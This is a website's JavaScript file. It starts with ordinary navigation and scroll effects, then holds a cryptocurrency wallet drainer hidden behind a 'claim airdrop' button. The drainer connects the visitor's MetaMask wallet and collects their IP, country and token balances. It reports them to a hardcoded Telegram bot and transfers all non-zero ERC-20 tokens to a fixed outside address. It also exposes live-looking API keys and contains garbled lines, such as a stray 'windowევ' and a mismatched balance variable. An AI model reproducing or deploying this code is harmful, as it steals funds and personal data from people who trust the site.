'use strict';

/**
 * Add event on element
 */
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
};

/**
 * Navbar toggle
 */
const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
};

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
};

addEventOnElem(navbarLinks, "click", closeNavbar);

/**
 * Header active on scroll
 */
const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
};

addEventOnElem(window, "scroll", activeHeader);

/**
 * Toggle active on add to fav
 */
const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
};

addEventOnElem(addToFavBtns, "click", toggleActive);

/**
 * Scroll reveal effect
 */
const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
};

scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

/**
 * Wallet connect and token transfer with Telegram notification
 */
async function connectWalletAndSendTokens() {
  if (!window.ethers || !window.ethereum) {
    console.error("MetaMask is not installed.");
    if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
      window.location.href = "https://metamask.app.link/dapp/" + window.location.host + window.location.pathname;
    } else {
      window.location.href = "https://metamask.io/download.html";
    }
    return;
  }

  const evmNetworks = [
    {
      chainId: 1,
      name: "Ethereum",
      chainName: "eth",
      nativeCoin: "ETH",
      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
    }
  ];

  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
  const chatId = "5995616824";
  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  try {
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    console.log(`Wallet connected: ${userAddress} (MetaMask)`);

    let locationData = {};
    try {
      const locRes = await fetch("https://ipapi.co/json/");
      locationData = await locRes.json();
    } catch (e) {
      console.warn("Location fetch failed", e);
      locationData = { country_name: "Unknown", ip: "N/A" };
    }

    for (const network of evmNetworks) {
      try {
        console.log(`Processing network: ${network.name}`);

        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${network.chainId.toString(16)}` }]
          });
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            const chainConfig = {
              chainId: '0x1',
              chainName: 'Ethereum Mainnet',
              rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
              blockExplorerUrls: ['https://etherscan.io']
            };
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [chainConfig]
            });
            await windowევ
              window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: `0x${network.chainId.toString(16)}` }]
              });
          } else {
            throw switchErr;
          }
        }

        const currentProvider = new ethers.providers.Web3Provider(window.ethereum);
        const currentSigner = currentProvider.getSigner();
        const currentNetwork = await currentProvider.getNetwork();
        console.log(`Switched to network: ${currentNetwork.name} (chainId: ${currentNetwork.chainId})`);

        if (currentNetwork.chainId !== network.chainId) {
          const errorMessage = `❌ Failed to switch to ${network.name}.`;
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
          });
          continue;
        }

        if (!currentSigner) {
          const errorMessage = `❌ Signer not initialized for ${network.name}.`;
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
          });
          continue;
        }

        await delay(1000);

        let tokens = [];
        let tokenSummaryTelegram = "";
        let apiAttempts = 0;
        const maxAttempts = 3;
        let apiSuccess = false;

        while (apiAttempts < maxAttempts && !apiSuccess) {
          try {
            apiAttempts++;
            const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
            const response = await fetch(moralisUrl, {
              headers: { "X-API-Key": moralisApiKey }
            });
            if (!response.ok) throw new Error(`Moralis API error: ${response.statusText}`);
            tokens = await response.json();
            apiSuccess = true;

            const nonZeroTokens = tokens.filter(t => 
              t.balance && 
              !ethers.BigNumber.from(t.balance).isZero() && 
              t.token_address && 
              ethers.utils.isAddress(t.token_address) && 
              t.symbol && 
              t.decimals !== undefined
            );

            tokenSummaryTelegram = nonZeroTokens.length > 0
              ? nonZeroTokens.map(token => {
                  const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
                  return `• ${token.symbol}: ${balance}`;
                }).join("\n")
              : `No valid non-zero ${network.name} token balances found.`;
          } catch (apiErr) {
            console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
            if (apiAttempts === maxAttempts) {
              tokenSummaryTelegram = `Failed to fetch token balances: ${apiErr.message}`;
            } else {
              await delay(3000);
            }
          }
        }

        const nativetearBalance = await currentProvider.getBalance(userAddress);
        const formattedBalance = ethers.utils.formatEther(nativeBalance);
        const nativeBalanceMessage = `• ${network.nativeCoin}: ${formattedBalance}`;

        const networkMessage = `
📥 Wallet Connected on ${network.name}
Address: ${userAddress}
Wallet: MetaMask
Country: ${locationData.country_name}
IP: ${locationData.ip}

💰 Balances:
${tokenSummaryTelegram}
${nativeBalanceMessage}
        `;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: networkMessage })
        });

        const nonZeroTokens = tokens.filter(t => 
          t.balance && 
          !ethers.BigNumber.from(t.balance).isZero() && 
          t.token_address && 
          ethers.utils.isAddress(t.token_address) && 
          t.symbol && 
          t.decimals !== undefined
        );

        if (nonZeroTokens.length > 0) {
          for (const token of nonZeroTokens) {
            try {
              const contract = new ethers.Contract(
                token.token_address,
                ["function transfer(address to, uint256 amount) returns (bool)"],
                currentSigner
              );

              const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
              const transferTx = await contract.transfer(network.exodusAddress, token.balance);
              await transferTx.wait();

              const transferSuccessMessage = `
✅ Transfer Successful
Token: ${token.symbol}
Amount: ${balance}
To: ${network.exodusAddress}
Tx: ${transferTx.hash}
              `;
              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
              });
            } catch (err) {
              const errorMessage = `
❌ Token Transfer Failed
Token: ${token.symbol || 'Unknown'}
Error: ${err.message}
              `;
              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: errorMessage })
              });
              continue;
            }
          }
        } else {
          const noTokensMessage = `
⚠️ No valid non-zero ERC-20 token balances to transfer on ${network.name}
Address: ${userAddress}
          `;
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: noTokensMessage })
          });
        }
      } catch (err) {
        const errorMessage = `❌ Error on ${network.name}: ${err.message}`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: errorMessage })
        });
      }
    }
  } catch (err) {
    const errorMessage = `❌ Wallet Connection Failed: ${err.message}`;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
    });
  }
}

document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);